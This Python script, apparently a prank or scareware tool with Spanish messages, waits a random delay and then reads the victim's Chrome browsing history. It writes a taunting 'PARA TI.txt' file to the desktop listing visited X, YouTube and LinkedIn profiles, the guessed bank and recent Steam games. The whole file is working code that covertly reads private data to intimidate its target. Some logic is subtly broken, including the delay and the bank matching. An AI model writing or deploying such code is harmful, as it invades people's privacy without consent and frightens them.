import glob
import os
import re
import sqlite3
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange

RANDOM_FILE_NAME = "../PARA TI.txt"

def get_user_path():
    return "{}/".format(Path.home())

def delay_action():
    n_hours = randrange(1, 4)
    n_mins = randrange(0, 60)
    print("Durmiendo {} horas y {} mins.".format(n_hours, n_mins))
    sleep(n_hours) # sleep(n_hours * 60 * 60 + n_mins * 60)

def create_random_file(user_path):
    random_file = open(user_path + "/OneDrive/Escritorio/" + RANDOM_FILE_NAME, "w")
    random_file.write("Hola.\n")
    return random_file

def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path,temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time,url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos...\n")
            sleep(3)

def check_steam_games(random_file):
    games = []
    steam_path = "C:\Program Files (x86)\Steam\steamapps\common\\*"
    try:
        games_path = glob.glob(steam_path)
        games_path.sort(key = os.path.getmtime, reverse=True)
        for game_path in games_path[:5]:
            if game_path.split("\\")[-1] not in ["Steam", "Steamworks"]:
                games.append(game_path.split("\\")[-1]) # Accedo al último item

        random_file.write("He visto que has estado jugando a {}...\n".format(", ".join(games[:3])))
    except NotADirectoryError:
        return None

def check_x_profiles(random_file, chrome_history):
    profiles_visited = []
    for item in chrome_history[:10]:
        results = re.findall("https://x.com/([A-Za-z0-9]+)$",item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
            random_file.write("He visto que has visitado los perfiles de {}...".format(", ".join(profiles_visited)))

def check_youtube_profiles(random_file, chrome_history):
    profiles_visited_yt = []
    for item in chrome_history[:10]:
        results = re.findall("youtube.com/@([A-Za-z0-9]+)$",item[2])
        if results:
            profiles_visited_yt.append(results[0])

    if profiles_visited_yt:
        random_file.write("He visto que has visitado los perfiles de {} en Youtube\n".format(", ".join(profiles_visited_yt)))

def check_linkedin_profiles(random_file, chrome_history):
    profiles_visited_ln = []
    for item in chrome_history[:10]:
        results = re.findall("https://www.linkedin.com/in/([A-Za-z]+)-?[0-9]*/$",item[2])
        if results:
            profiles_visited_ln.append(results[0])
    if profiles_visited_ln:
        random_file.write("He visto que has visitado los perfiles de {} en Linkedin\n".format(", ".join(profiles_visited_ln)))

def check_bank_account(random_file, chrome_history):
    his_bank = None
    banks = ["BBVA", "BROU", "Santander", "ITAU", "Scotiabank"]
    for item in chrome_history:
        for b in banks:
            if item[0].lower() in b.lower():
                his_bank = b
                break
        if his_bank:
            random_file.write("Se que tu banco es: {}.\n".format(his_bank))
            break


def main():
    #Esperamos entre 1 y 3 horas
    delay_action()
    #Calculamos la ruta del usuario
    user_path = get_user_path()
    #Obtenemos el historial de Google Chrome cuando sea posible
    chrome_history = get_chrome_history(user_path)
    # Creamos el archivo
    random_file = create_random_file(user_path)
    check_x_profiles(random_file, chrome_history)
    check_youtube_profiles(random_file, chrome_history)
    check_linkedin_profiles(random_file, chrome_history)
    check_bank_account(random_file, chrome_history)
    check_steam_games(random_file)

if __name__ == "__main__":
    main()